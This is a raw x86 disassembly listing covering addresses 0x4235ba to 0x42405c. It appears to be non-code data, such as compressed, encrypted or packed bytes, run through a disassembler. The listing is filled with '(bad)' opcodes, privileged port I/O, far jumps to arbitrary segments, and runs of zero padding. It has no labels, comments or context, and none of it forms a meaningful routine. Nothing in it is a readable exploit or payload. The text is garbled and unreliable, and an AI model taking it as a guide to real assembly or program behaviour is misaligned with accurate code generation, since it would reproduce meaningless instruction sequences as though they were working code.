  4235ba:	fs jmp 0xc69c:0x9d0b8a31
  4235c2:	fisttp DWORD PTR [ebx]
  4235c4:	test   eax,0x39552670
  4235c9:	and    bh,BYTE PTR [eax+eiz*2-0x66dfcfa6]
  4235d0:	lods   al,BYTE PTR ds:[esi]
  4235d1:	mov    ds:0x2f60a0ca,al
  4235d6:	jge    0x42362a
  4235d8:	push   esp
  4235d9:	mov    edx,0x32f80b71
  4235de:	popf   
  4235df:	mov    DWORD PTR [edi-0x9],0x585f4a46
  4235e6:	push   cs
  4235e7:	add    DWORD PTR [ebp+ebp*1-0xf],edx
  4235eb:	xchg   esp,eax
  4235ec:	(bad)  
  4235ed:	das    
  4235ee:	into   
  4235ef:	add    eax,0x2c692f3e
  4235f4:	(bad)  
  4235f5:	mov    ah,0x83
  4235f7:	stos   BYTE PTR es:[edi],al
  4235f8:	inc    edx
  4235f9:	mov    ebx,0xe8af30cc
  4235fe:	pop    edi
  4235ff:	rol    esi,1
  423601:	cmp    al,0x94
  423603:	mov    edx,0x797fbfc1
  423608:	cdq    
  423609:	gs ins DWORD PTR es:[edi],dx
  42360b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42360c:	jno    0x4235e8
  42360e:	test   al,bl
  423610:	mov    eax,0x97710b2c
  423615:	adc    edi,0x227d253b
  42361b:	out    0xe,al
  42361d:	mov    ah,0x80
  42361f:	cli    
  423620:	adc    ebp,edx
  423622:	push   cs
  423623:	(bad)  
  423624:	sbb    BYTE PTR [ebp-0x41],al
  423627:	loopne 0x42367d
  423629:	push   ecx
  42362a:	repnz outs dx,DWORD PTR ds:[esi]
  42362c:	xor    al,0xc4
  42362e:	je     0x42363c
  423630:	push   edx
  423631:	aaa    
  423632:	test   BYTE PTR [ebp+0x29298f96],ch
  423638:	sbb    al,0x7e
  42363a:	hlt    
  42363b:	(bad)  
  42363c:	ins    DWORD PTR es:[edi],dx
  42363d:	je     0x423615
  42363f:	test   al,0xf2
  423641:	mov    esi,ebp
  423643:	xchg   ebx,eax
  423644:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423645:	fdivr  QWORD PTR [esi+eiz*2-0x42]
  423649:	sbb    al,0xbf
  42364b:	lea    eax,[eax]
  42364d:	pop    esi
  42364e:	jecxz  0x423688
  423650:	lods   eax,DWORD PTR ds:[esi]
  423651:	mov    ?,WORD PTR [ecx+0x4e5e4c98]
  423657:	fst    DWORD PTR [ecx]
  423659:	test   eax,0xe58ee48e
  42365e:	rcl    ebp,cl
  423660:	scas   al,BYTE PTR es:[edi]
  423661:	rol    DWORD PTR [ebx-0x53f0dd27],cl
  423667:	dec    esp
  423668:	cmc    
  423669:	call   0x0:0x4a7329f9
	...
  4236d4:	add    BYTE PTR [eax],al
  4236d6:	or     BYTE PTR [edi-0x8808b84],0x88
  4236dd:	jmp    FWORD PTR [esi-0x6f]
  4236e0:	jl     0x4236f5
  4236e2:	leave  
  4236e3:	div    BYTE PTR [esp+edi*8+0x67]
  4236e7:	jl     0x4236ea
  4236e9:	add    BYTE PTR [eax],al
  4236eb:	add    DWORD PTR [eax],eax
  4236ed:	add    BYTE PTR [edi],bh
  4236ef:	mov    ?,WORD PTR [eax+esi*1-0x4]
  4236f3:	adc    edx,DWORD PTR [eax+0x47]
  4236f6:	test   DWORD PTR [edx],ebx
  4236f8:	or     DWORD PTR [ebp+0x65],0x7c26dcf3
  4236ff:	sbb    eax,0x5065eab0
  423704:	scas   al,BYTE PTR es:[edi]
  423705:	(bad)  
  423706:	mov    edi,0xc269d401
  42370b:	stos   DWORD PTR es:[edi],eax
  42370c:	fs mov esp,0xf6ce0d8b
  423712:	fs xor al,0x5f
  423715:	jae    0x423701
  423717:	or     al,0x76
  423719:	or     esi,DWORD PTR [eax+0x55]
  42371c:	and    al,0xd1
  42371e:	xchg   edx,eax
  42371f:	mov    BYTE PTR [esi+0x1b],cl
  423722:	shr    DWORD PTR [ecx+0x31],0x0
  423726:	or     eax,0x8325d82d
  42372b:	stc    
  42372c:	and    DWORD PTR [ebx],edx
  42372e:	dec    esp
  42372f:	retf   0x56e4
  423732:	retf   
  423733:	sub    BYTE PTR [ebx+ecx*4+0x34eedbb5],bh
  42373a:	ja     0x4236e4
  42373c:	test   DWORD PTR [edx],edi
  42373e:	add    al,0xa8
  423740:	stos   BYTE PTR es:[edi],al
  423741:	lock jmp DWORD PTR [eax+0x22ea327c]
  423748:	inc    eax
  42374a:	fld    DWORD PTR cs:[eax-0x3f]
  42374e:	cmp    dl,BYTE PTR [edi-0x396319cb]
  423754:	xor    al,0x55
  423756:	jbe    0x423725
  423758:	retf   0x239
  42375b:	xor    bh,bl
  42375d:	sub    ebp,DWORD PTR [edi+0x7f]
  423760:	hlt    
  423761:	ror    BYTE PTR [esi+0x0],cl
  423764:	call   DWORD PTR [esi]
  423766:	mov    ah,0x9b
  423768:	ret    0xc7ae
  42376b:	cmp    BYTE PTR ds:0xdd46768e,dl
  423771:	add    dh,BYTE PTR [ecx+0x4c967fab]
  423777:	sub    DWORD PTR [edx-0x70c12114],ebx
  42377d:	call   0xcf870ed9
  423782:	add    edx,esp
  423784:	scas   eax,DWORD PTR es:[edi]
  423785:	mov    ds:0xb16f6ca5,al
  42378a:	mov    BYTE PTR ds:0x3e025653,0xb1
  423791:	test   BYTE PTR [eax+0xe],dl
  423794:	inc    ebp
  423795:	push   esp
  423796:	in     al,dx
  423797:	push   ebx
  423798:	add    BYTE PTR [edx-0x15c8e905],0xe7
  42379f:	mov    ecx,0xb586e685
  4237a4:	aad    0x46
  4237a6:	add    ah,BYTE PTR [edi]
  4237a8:	push   cs
  4237a9:	enter  0xaede,0xb
  4237ad:	(bad)  
  4237ae:	fsubr  QWORD PTR [eax+edx*2+0x6a69b240]
  4237b5:	sbb    eax,0x522f23ac
  4237ba:	fild   QWORD PTR [ecx-0x7b]
  4237bd:	add    ecx,DWORD PTR [ebp+0x4fee0cf5]
  4237c3:	xchg   ecx,eax
  4237c4:	mov    bl,0x42
  4237c6:	inc    edi
  4237c7:	nop
  4237c8:	inc    eax
  4237c9:	xchg   ebp,eax
  4237ca:	pushf  
  4237cb:	inc    edi
  4237cc:	xor    al,0x30
  4237ce:	loopne 0x42380d
  4237d0:	pop    eax
  4237d1:	push   0x37
  4237d3:	retf   0x9622
  4237d6:	pop    edx
  4237d7:	xor    eax,0x4c0f1321
  4237dc:	xchg   esi,eax
  4237dd:	cld    
  4237de:	jecxz  0x4237c3
  4237e0:	pop    esi
  4237e1:	lods   al,BYTE PTR ds:[esi]
  4237e2:	adc    DWORD PTR [edx-0x7d0494ed],0x25f6086c
  4237ec:	scas   al,BYTE PTR es:[edi]
  4237ed:	rol    BYTE PTR [eax],0x0
	...
  423854:	add    BYTE PTR [eax],al
  423856:	xor    al,0x23
  423858:	jo     0x4237f7
  42385a:	ja     0x42383b
  42385c:	std    
  42385d:	stos   DWORD PTR es:[edi],eax
  42385e:	(bad)  
  42385f:	sbb    edx,esi
  423861:	jmp    0x7d67:0x96a9e372
  423868:	add    DWORD PTR [eax],eax
  42386a:	add    BYTE PTR [ecx],al
  42386c:	add    BYTE PTR [eax],al
  42386e:	jge    0x4238bb
  423870:	or     dh,BYTE PTR [ecx]
  423872:	ins    DWORD PTR es:[edi],dx
  423873:	and    al,0x53
  423875:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423876:	and    al,0xb5
  423878:	push   es
  423879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42387a:	in     al,0x7
  42387c:	inc    esp
  42387d:	(bad)  
  42387e:	aaa    
  42387f:	outs   dx,BYTE PTR ds:[esi]
  423880:	mov    ch,0xae
  423882:	mov    WORD PTR [ebx+0x9],es
  423885:	xchg   ebp,eax
  423886:	dec    eax
  423887:	popa   
  423888:	jo     0x423828
  42388a:	inc    edi
  42388b:	sub    al,0x28
  42388d:	in     eax,dx
  42388e:	cld    
  42388f:	scas   al,BYTE PTR es:[edi]
  423890:	fsub   QWORD PTR [ebp-0x109e7b42]
  423896:	in     eax,dx
  423897:	xchg   esi,eax
  423898:	xchg   ebx,eax
  423899:	addr16 dec edi
  42389b:	adc    eax,0x24281dba
  4238a0:	mov    esp,0x6c9f4c96
  4238a5:	mov    al,0x1d
  4238a7:	int    0xd1
  4238a9:	inc    edi
  4238aa:	mov    ds:0xde5bd90d,eax
  4238af:	sub    al,0x34
  4238b1:	or     ebp,DWORD PTR [ebp+0x24]
  4238b4:	push   eax
  4238b5:	jle    0x4238b7
  4238b7:	mov    eax,ds:0x34e9a25b
  4238bc:	mov    bl,0x34
  4238be:	je     0x42391e
  4238c0:	mov    DWORD PTR [ebx+0x2f8167e6],eax
  4238c6:	loope  0x42392e
  4238c8:	aaa    
  4238c9:	jmp    0x1ec30ade
  4238ce:	ficom  WORD PTR [ecx+0x29896ac7]
  4238d4:	or     DWORD PTR [eax],esp
  4238d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238d7:	dec    ebp
  4238d8:	bound  esp,QWORD PTR [esi+0x24aa3b22]
  4238de:	xchg   eax,ecx
  4238e0:	popf   
  4238e1:	loop   0x42391c
  4238e3:	sbb    BYTE PTR [eax-0x5c],dl
  4238e6:	add    ah,BYTE PTR [esi-0x56facab3]
  4238ec:	and    esi,DWORD PTR [ecx]
  4238ee:	adc    al,0xc9
  4238f0:	fadd   QWORD PTR [ecx]
  4238f2:	rol    BYTE PTR [ecx-0x68d6134f],cl
  4238f8:	cmp    DWORD PTR [esi],esi
  4238fa:	arpl   WORD PTR [edi+eax*1-0x7bf07abd],dx
  423901:	enter  0xf8b6,0x11
  423905:	add    ah,dh
  423907:	xchg   bl,dl
  423909:	bts    DWORD PTR [ecx+0x19700db8],eax
  423910:	test   cl,ah
  423912:	outs   dx,BYTE PTR ds:[esi]
  423913:	jno    0x423983
  423915:	push   ebx
  423916:	stos   BYTE PTR es:[edi],al
  423917:	rcr    BYTE PTR [esi+0x2a3b288c],cl
  42391d:	ror    bh,cl
  42391f:	xor    al,0x70
  423921:	fcmovne st,st(3)
  423923:	out    dx,al
  423924:	jmp    0x4238e5
  423926:	sub    DWORD PTR [eax+ebx*4-0x2a6f924c],esi
  42392d:	sub    BYTE PTR [edx],dl
  42392f:	sbb    ebx,edx
  423931:	int3   
  423932:	repz je 0x42394b
  423935:	sti    
  423936:	cdq    
  423937:	imul   edi,DWORD PTR [edi+0x77],0xfffffff5
  42393b:	xor    edx,DWORD PTR [ecx]
  42393d:	call   0xac6667b0
  423942:	call   0xa3ad:0xb809ac08
  423949:	mov    esi,0x63914a94
  42394e:	jmp    0x423909
  423950:	shr    BYTE PTR [edi+0x59],cl
  423953:	xor    esp,ebp
  423955:	and    BYTE PTR ds:0x242a33f4,ch
  42395b:	push   ebp
  42395c:	jl     0x4239da
  42395e:	xor    esp,DWORD PTR [edi]
  423960:	int    0x2c
  423962:	mov    eax,ds:0x7b58af53
  423967:	inc    edi
  423968:	(bad)  
  423969:	pop    edx
  42396a:	or     eax,0x210f80
	...
  4239d3:	add    BYTE PTR [eax],al
  4239d5:	add    BYTE PTR [edx-0x770e5c],cl
  4239db:	(bad)  
  4239dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239de:	push   ecx
  4239df:	sbb    eax,0x46fb2bbd
  4239e4:	pop    esi
  4239e5:	out    dx,eax
  4239e6:	addr16 jle 0x4239ea
  4239e9:	add    BYTE PTR [eax],al
  4239eb:	add    DWORD PTR [eax],eax
  4239ed:	add    BYTE PTR [esi-0x80],ah
  4239f0:	loopne 0x423a42
  4239f2:	jmp    0x4239f5
  4239f4:	jns    0x423a3b
  4239f6:	xchg   edx,eax
  4239f7:	dec    esp
  4239f8:	mov    ch,0xc3
  4239fa:	mov    cl,0x36
  4239fc:	jo     0x423a16
  4239fe:	dec    edx
  4239ff:	dec    edx
  423a00:	push   eax
  423a01:	mov    edx,0x9cf72eee
  423a06:	out    dx,eax
  423a07:	inc    ecx
  423a08:	jmp    0x4239e7
  423a0a:	test   al,0x8a
  423a0c:	and    DWORD PTR [ebx+edx*1+0x3178a5b1],esi
  423a13:	hlt    
  423a14:	or     bh,0x9f
  423a17:	cmp    al,0x5a
  423a19:	mov    ds:0xe9077e16,al
  423a1e:	xchg   edi,ebp
  423a20:	fwait
  423a21:	pop    edx
  423a22:	mov    ebx,eax
  423a24:	rcr    esi,cl
  423a26:	jo     0x4239a8
  423a28:	xor    esp,DWORD PTR [esi+ebp*2+0x607f2817]
  423a2f:	add    edi,DWORD PTR [edx-0x6f1afd73]
  423a35:	es adc ch,bh
  423a38:	cmp    eax,0x2c308f58
  423a3d:	cmc    
  423a3e:	stc    
  423a3f:	adc    eax,0x6aae5c55
  423a44:	loopne 0x423a24
  423a46:	xchg   BYTE PTR [esi+edi*8],dh
  423a49:	mov    edx,0xf4e9f305
  423a4e:	ja     0x423a49
  423a50:	test   DWORD PTR [esi+0x4bc388e2],esi
  423a56:	sub    edi,DWORD PTR [eax]
  423a58:	out    0xea,eax
  423a5a:	xchg   ebx,eax
  423a5b:	inc    eax
  423a5c:	and    eax,0x3c2434d8
  423a61:	and    dl,BYTE PTR [ebp-0x1532c106]
  423a67:	test   eax,0xf5f79c5
  423a6c:	js     0x423a74
  423a6e:	xor    al,0xa1
  423a70:	sbb    esi,DWORD PTR [ecx]
  423a72:	nop
  423a73:	jle    0x423abe
  423a75:	scas   al,BYTE PTR es:[edi]
  423a76:	mov    esp,ebp
  423a78:	pop    esi
  423a79:	in     eax,dx
  423a7a:	daa    
  423a7b:	adc    DWORD PTR [ebp-0x1],ebx
  423a7e:	fucomi st,st(3)
  423a80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a81:	jmp    0x4356522b
  423a86:	into   
  423a87:	(bad)  
  423a88:	push   eax
  423a89:	lock shl BYTE PTR [ecx+0x7d],1
  423a8d:	in     al,0xe7
  423a8f:	clc    
  423a90:	push   ebx
  423a91:	jbe    0x423aad
  423a93:	xchg   esi,eax
  423a94:	scas   eax,DWORD PTR es:[edi]
  423a95:	jl     0x423a8c
  423a97:	pop    ecx
  423a98:	add    edx,DWORD PTR [edx+0xd36973c]
  423a9e:	xor    esp,ebx
  423aa0:	rcl    DWORD PTR [ebp+edx*4+0x5318d95],1
  423aa7:	test   BYTE PTR [ecx+0x16],0xfc
  423aab:	int    0x49
  423aad:	add    ebx,DWORD PTR [eax]
  423aaf:	mov    eax,ds:0xf708607f
  423ab4:	dec    esp
  423ab5:	dec    ecx
  423ab6:	lds    ecx,FWORD PTR [eax]
  423ab8:	xchg   DWORD PTR [ebx],ebx
  423aba:	pop    ecx
  423abb:	pop    ss
  423abc:	mov    dl,0x4b
  423abe:	xchg   edi,eax
  423abf:	or     al,0x96
  423ac1:	nop
  423ac2:	mov    cl,0x1
  423ac4:	xchg   edi,eax
  423ac5:	cmp    bl,dl
  423ac7:	aam    0xc1
  423ac9:	mov    dh,dl
  423acb:	mov    eax,0x6605d799
  423ad0:	cmc    
  423ad1:	xor    al,0xbf
  423ad3:	push   ds
  423ad4:	push   edi
  423ad5:	ins    BYTE PTR es:[edi],dx
  423ad6:	push   0x801da0bc
  423adb:	mov    al,BYTE PTR [ecx-0x56]
  423ade:	mov    cl,0xe2
  423ae0:	adc    dx,WORD PTR [eax+edx*1+0x538c25c9]
  423ae8:	and    ecx,DWORD PTR [eax]
  423aea:	stc    
  423aeb:	fwait
  423aec:	addr16 or al,0x0
	...
  423b53:	add    BYTE PTR [eax],al
  423b55:	add    BYTE PTR [eax],dh
  423b57:	cmp    eax,0xdf7d9f75
  423b5c:	cli    
  423b5d:	mov    edi,0x60851ed8
  423b62:	sar    BYTE PTR [eax+0x65],0xca
  423b66:	addr16 jg 0x423b6a
  423b69:	add    BYTE PTR [eax],al
  423b6b:	add    DWORD PTR [eax],eax
  423b6d:	add    BYTE PTR [edx],dh
  423b6f:	sar    esi,cl
  423b71:	fiadd  DWORD PTR [esi+edi*2+0x370fbbd1]
  423b78:	dec    ecx
  423b79:	push   ebx
  423b7a:	push   esi
  423b7b:	mov    al,ds:0x601af141
  423b80:	mov    bh,0xef
  423b82:	xchg   si,ax
  423b84:	mov    ds:0x2dfec7cd,al
  423b89:	adc    eax,0xfb3132f2
  423b8e:	and    eax,0x2d9cb932
  423b93:	pop    eax
  423b94:	imul   BYTE PTR [edx+0xb]
  423b97:	add    DWORD PTR [ecx+0x2d47529],ebp
  423b9d:	push   ebp
  423b9e:	or     al,ah
  423ba0:	int    0x48
  423ba2:	test   al,0x66
  423ba4:	clc    
  423ba5:	lea    ebx,[esi+0x53]
  423ba8:	cld    
  423ba9:	mov    dh,0x4b
  423bab:	dec    edx
  423bac:	ds retf 
  423bae:	cld    
  423baf:	pop    edi
  423bb0:	pushf  
  423bb1:	jmp    0x423c27
  423bb3:	jecxz  0x423bf7
  423bb5:	add    dl,bl
  423bb7:	xchg   edi,eax
  423bb8:	(bad)  
  423bb9:	sbb    al,0x28
  423bbb:	push   ebx
  423bbc:	or     eax,0x1d6cbcd2
  423bc1:	dec    edx
  423bc2:	jmp    0x423be4
  423bc4:	jmp    0xe7618649
  423bc9:	cmp    al,0x8e
  423bcb:	retf   
  423bcc:	fcmovbe st,st(2)
  423bce:	add    esp,DWORD PTR [edi+0x1c]
  423bd1:	push   ebx
  423bd2:	pop    eax
  423bd3:	je     0x423b95
  423bd5:	sub    eax,0x15a0399d
  423bda:	jle    0x423be4
  423bdc:	out    0x29,eax
  423bde:	cdq    
  423bdf:	popf   
  423be0:	stos   BYTE PTR es:[edi],al
  423be1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423be2:	ficomp DWORD PTR [esi]
  423be4:	test   al,0xb9
  423be6:	sbb    al,0x2a
  423be8:	fistp  WORD PTR [esi]
  423bea:	and    bl,dh
  423bec:	cmp    edi,DWORD PTR [edi+0x21]
  423bef:	sbb    edi,DWORD PTR [edi]
  423bf1:	fcom   DWORD PTR [edx+0x4cc91fbc]
  423bf7:	jb     0x423beb
  423bf9:	sub    ah,ah
  423bfb:	sbb    dl,BYTE PTR [esi]
  423bfd:	icebp  
  423bfe:	inc    esi
  423bff:	fist   DWORD PTR [ebx+esi*2]
  423c02:	pop    es
  423c03:	je     0x423c67
  423c05:	shl    BYTE PTR [edx+0x2cebcbde],1
  423c0b:	(bad)  
  423c0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c0d:	xchg   edi,eax
  423c0e:	xor    ebx,DWORD PTR [eax+0x76]
  423c11:	test   BYTE PTR [ebp-0x12],ch
  423c14:	pop    es
  423c15:	into   
  423c16:	sub    edx,DWORD PTR [ebx]
  423c18:	push   0xd2a79e42
  423c1d:	int3   
  423c1e:	sbb    BYTE PTR [ecx],al
  423c20:	int3   
  423c21:	retf   
  423c22:	clc    
  423c23:	mov    ebp,0xd75eadab
  423c28:	or     eax,0x253181fe
  423c2d:	inc    ebx
  423c2e:	adc    al,0x7c
  423c30:	aad    0xb9
  423c32:	lahf   
  423c33:	mov    ah,0xb
  423c35:	in     al,0xf3
  423c37:	mov    dl,BYTE PTR [ebp-0x115b6f43]
  423c3d:	mov    ds:0x7c019cf7,eax
  423c42:	pop    es
  423c43:	repnz out 0x39,eax
  423c46:	push   esi
  423c47:	add    BYTE PTR [esi-0x42cb330f],0x82
  423c4e:	loop   0x423cab
  423c50:	jmp    0x423bed
  423c52:	loop   0x423c56
  423c54:	rcl    DWORD PTR [ebx],1
  423c56:	adc    BYTE PTR [edi-0x6052d9c2],ah
  423c5c:	(bad)  
  423c5d:	push   0x3bc1c228
  423c62:	(bad)
  423c66:	das    
  423c67:	pop    edi
  423c68:	sub    dh,BYTE PTR [esp+esi*4]
  423c6b:	sub    cl,BYTE PTR ds:0xd2
	...
  423cd5:	add    ch,bh
  423cd7:	(bad)  
  423cd8:	test   eax,0xff57ab46
  423cdd:	call   FWORD PTR [eax-0x57bb99e9]
  423ce3:	dec    esi
  423ce4:	sub    dl,BYTE PTR [ebx]
  423ce6:	add    BYTE PTR [bx+di],0x0
  423cea:	add    BYTE PTR [ecx],al
  423cec:	add    BYTE PTR [eax],al
  423cee:	mov    edi,0xdfa0d356
  423cf3:	inc    edi
  423cf5:	lods   eax,DWORD PTR ds:[esi]
  423cf6:	stos   BYTE PTR es:[edi],al
  423cf7:	std    
  423cf8:	pop    es
  423cf9:	mov    al,ds:0x7708cd6b
  423cfe:	or     al,0xc5
  423d00:	std    
  423d01:	cmp    edi,ebp
  423d03:	adc    eax,0x8f60e052
  423d08:	iret   
  423d09:	data16 loopne 0x423d7d
  423d0c:	ret    
  423d0d:	sbb    dl,ch
  423d0f:	cdq    
  423d10:	push   edx
  423d11:	add    ebp,edx
  423d13:	dec    ecx
  423d14:	fld    QWORD PTR [edi]
  423d16:	lock or eax,0xeb5b659e
  423d1c:	outs   dx,BYTE PTR ds:[esi]
  423d1d:	fs out dx,al
  423d1f:	mov    edi,0x8e29d615
  423d24:	push   es
  423d25:	mov    eax,0xeb1394bb
  423d2a:	iret   
  423d2b:	and    dl,dl
  423d2d:	cs out dx,eax
  423d2f:	std    
  423d30:	je     0x423d9e
  423d32:	add    dl,bh
  423d34:	sub    DWORD PTR [ecx],eax
  423d36:	repnz sti 
  423d38:	push   ecx
  423d39:	push   ebp
  423d3a:	or     al,0x30
  423d3c:	daa    
  423d3d:	sbb    BYTE PTR [edi],0x3c
  423d40:	fisttp QWORD PTR [ebx]
  423d42:	mov    cl,0x90
  423d44:	std    
  423d45:	repz mov ebp,0xd6424880
  423d4b:	or     DWORD PTR [eax+0x5],0x2
  423d4f:	(bad)  
  423d50:	je     0x423cf9
  423d52:	and    DWORD PTR [ecx-0x2573db72],ecx
  423d58:	int3   
  423d59:	add    bl,BYTE PTR [esi+0x59ff707d]
  423d5f:	pusha  
  423d60:	fisttp WORD PTR ds:0x7ae172ee
  423d66:	lods   eax,DWORD PTR ds:[esi]
  423d67:	or     DWORD PTR ds:0x36bf3a27,esp
  423d6d:	pop    edx
  423d6e:	(bad)  
  423d6f:	sar    DWORD PTR [edi+0x346633aa],1
  423d75:	fwait
  423d76:	add    cl,BYTE PTR [esi]
  423d78:	inc    eax
  423d79:	ins    BYTE PTR es:[edi],dx
  423d7a:	mov    ebx,0xa7a612e8
  423d7f:	sub    BYTE PTR [ebp-0x65],dl
  423d82:	mov    eax,0xf87711a6
  423d87:	mov    esi,0xbafdcd48
  423d8c:	sti    
  423d8d:	pop    es
  423d8e:	outs   dx,BYTE PTR ds:[esi]
  423d8f:	cmp    ecx,DWORD PTR [eax+0x59bbc8c2]
  423d95:	(bad)  
  423d96:	dec    edi
  423d97:	fadd   st,st(6)
  423d99:	sub    cl,BYTE PTR [edi]
  423d9b:	pusha  
  423d9c:	call   0xfdb45421
  423da1:	adc    al,BYTE PTR ds:0x6c170899
  423da7:	lock ret 0x7a04
  423dab:	mov    WORD PTR [eax+ebp*2+0xc],fs
  423daf:	out    dx,al
  423db0:	iret   
  423db1:	(bad)  
  423db3:	xor    edi,ebp
  423db5:	add    dl,BYTE PTR [edi]
  423db7:	sub    eax,0xef2c42f
  423dbc:	fwait
  423dbd:	pop    es
  423dbe:	aaa    
  423dbf:	jmp    0x15dab76e
  423dc4:	stos   BYTE PTR es:[edi],al
  423dc5:	pop    ds
  423dc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dc7:	cmp    DWORD PTR [ebx+0x20374aad],esi
  423dcd:	xchg   edi,eax
  423dce:	or     dh,BYTE PTR [edi-0x71400a40]
  423dd4:	mov    esi,0xf0ee3d00
  423dd9:	data16 cmp BYTE PTR [ebp+0x7e],0x25
  423dde:	pusha  
  423ddf:	inc    ebp
  423de0:	adc    ah,BYTE PTR [ebx]
  423de2:	in     al,dx
  423de3:	daa    
  423de4:	cmp    DWORD PTR [ecx+0x67],ebx
  423de7:	in     al,dx
  423de8:	cld    
  423de9:	push   ecx
  423dea:	xor    BYTE PTR [ecx-0x3c],0x55
	...
  423e56:	(bad)  
  423e57:	test   BYTE PTR [edi-0x118668f7],0xff
  423e5e:	daa    
  423e5f:	mov    DWORD PTR [eax+0x736ab2d2],esp
  423e65:	cmp    esp,DWORD PTR [edi-0x7f]
  423e68:	add    DWORD PTR [eax],eax
  423e6a:	add    BYTE PTR [ecx],al
  423e6c:	add    BYTE PTR [eax],al
  423e6e:	gs mov esi,0xb02b435a
  423e74:	push   ds
  423e75:	(bad)
  423e78:	push   ecx
  423e79:	ins    DWORD PTR es:[edi],dx
  423e7a:	add    ah,BYTE PTR [eax+0x15fce4fa]
  423e80:	cmp    bl,BYTE PTR [eax]
  423e82:	jnp    0x423e74
  423e84:	sbb    al,0x10
  423e86:	int3   
  423e87:	fs push es
  423e89:	call   0xa1e:0x5fb30e36
  423e90:	ret    0xea4c
  423e93:	out    0xac,eax
  423e95:	cmp    eax,0x37b66178
  423e9a:	pop    ds
  423e9b:	test   eax,0x471470c1
  423ea0:	(bad)  
  423ea1:	xchg   edx,eax
  423ea2:	mov    ebx,0x6beaba9
  423ea7:	sbb    DWORD PTR [esi+0x5],edi
  423eaa:	push   cs
  423eab:	xchg   esi,eax
  423eac:	jmp    0xa770:0xb08a7141
  423eb3:	mov    dl,0x51
  423eb5:	cmp    BYTE PTR [eax-0x16],cl
  423eb8:	fst    QWORD PTR [edx-0x16]
  423ebb:	mov    bl,0x26
  423ebd:	stos   DWORD PTR es:[edi],eax
  423ebe:	sub    ebp,DWORD PTR [ecx]
  423ec0:	xor    esp,edi
  423ec2:	test   BYTE PTR [eax],al
  423ec4:	test   eax,0x4eb7d2e2
  423ec9:	out    0xca,eax
  423ecb:	push   0x1a6e9511
  423ed0:	clc    
  423ed1:	icebp  
  423ed2:	pop    ebx
  423ed3:	adc    eax,DWORD PTR [esi+edx*8-0x70043fe7]
  423eda:	sub    al,BYTE PTR [ebx+0x3c]
  423edd:	adc    eax,0x54112491
  423ee2:	fs dec eax
  423ee4:	mov    al,ds:0x6afd9632
  423ee9:	imul   esi,DWORD PTR [edx-0x1e15b08],0x59c91870
  423ef3:	mov    ch,0x23
  423ef5:	sbb    esp,ebp
  423ef7:	rcl    BYTE PTR [edx+0x7b],cl
  423efa:	stos   BYTE PTR es:[edi],al
  423efb:	or     DWORD PTR [esp+ebp*1+0x6beb658e],ebx
  423f02:	(bad)  
  423f03:	fnstsw WORD PTR [ebx-0x2936185c]
  423f09:	cmp    cl,bl
  423f0b:	adc    eax,edx
  423f0d:	xchg   esi,eax
  423f0e:	bound  esi,QWORD PTR [eax-0xfcf81db]
  423f14:	call   0xe68f1f8
  423f19:	sahf   
  423f1a:	les    esi,FWORD PTR ds:0x1a51ec54
  423f20:	cs mov al,0x78
  423f23:	cmp    al,0xf1
  423f25:	mov    ebp,0x98552285
  423f2a:	addr16 mov dl,0x58
  423f2d:	arpl   WORD PTR [esi],dx
  423f2f:	lock or bl,BYTE PTR [edx+0x5]
  423f33:	iret   
  423f34:	mov    esi,0xe78f2c0d
  423f39:	test   eax,0x812ab00
  423f3e:	aaa    
  423f3f:	imul   ebx,DWORD PTR [eax-0x1e414361],0xffffffcd
  423f46:	out    0x9c,al
  423f48:	inc    esi
  423f49:	mov    ds:0x2fb03b8,eax
  423f4e:	and    esi,DWORD PTR [ebx+0xf]
  423f51:	add    eax,0x6ac4e318
  423f56:	push   0x33b01c05
  423f5b:	shr    ecx,0x5c
  423f5e:	gs push esp
  423f60:	clc    
  423f61:	xchg   edi,eax
  423f62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f63:	aad    0x47
  423f65:	xchg   eax,ecx
  423f67:	push   0xffffffa8
  423f69:	lahf   
  423f6a:	inc    edi
  423f6b:	and    eax,0x548f
	...
  423fd4:	add    BYTE PTR [eax],al
  423fd6:	scas   al,BYTE PTR es:[edi]
  423fd7:	call   0x9fff:0xff74b964
  423fde:	adc    al,0x96
  423fe0:	sbb    al,0xd9
  423fe2:	cmp    BYTE PTR [esi-0x7d98ee4c],dl
  423fe8:	add    DWORD PTR [eax],eax
  423fea:	add    BYTE PTR [ecx],al
  423fec:	add    BYTE PTR [eax],al
  423fee:	xchg   DWORD PTR ds:0xbd0887c4,edx
  423ff4:	mov    ?,WORD PTR [eax]
  423ff6:	repnz das 
  423ff8:	hlt    
  423ff9:	ins    BYTE PTR es:[di],dx
  423ffb:	xor    eax,0xfbdc7e2b
  424000:	mov    bl,0x8d
  424003:	call   0xe3a12280
  424008:	iret   
  424009:	sbb    al,0x9d
  42400b:	dec    edx
  42400c:	imul   BYTE PTR [edi+0x2a56aede]
  424012:	jne    0x423ffa
  424014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424015:	sub    al,0xb7
  424017:	das    
  424018:	not    DWORD PTR [ecx+0x6437d6b7]
  42401e:	jecxz  0x42409a
  424020:	xor    ebp,DWORD PTR [edx]
  424022:	ds shl bl,1
  424025:	hlt    
  424026:	in     eax,0x76
  424028:	add    BYTE PTR [ebx-0x2493ca59],al
  42402e:	pop    esp
  42402f:	sub    eax,0xd8681918
  424034:	sub    ch,BYTE PTR [esi-0x47d81078]
  42403a:	call   0xe79e:0xacf89f3a
  424041:	loope  0x423fc7
  424043:	pop    ss
  424044:	gs hlt 
  424046:	into   
  424047:	and    eax,ebp
  424049:	out    dx,al
  42404a:	xchg   ebp,eax
  42404b:	mov    cl,0x8f
  42404d:	lods   eax,DWORD PTR ds:[esi]
  42404e:	dec    edi
  42404f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424050:	hlt    
  424051:	push   esi
  424052:	pop    es
  424053:	and    DWORD PTR [edi-0x79],esi
  424056:	or     esi,DWORD PTR [esi-0xd2c4350]
  42405c:	iret   
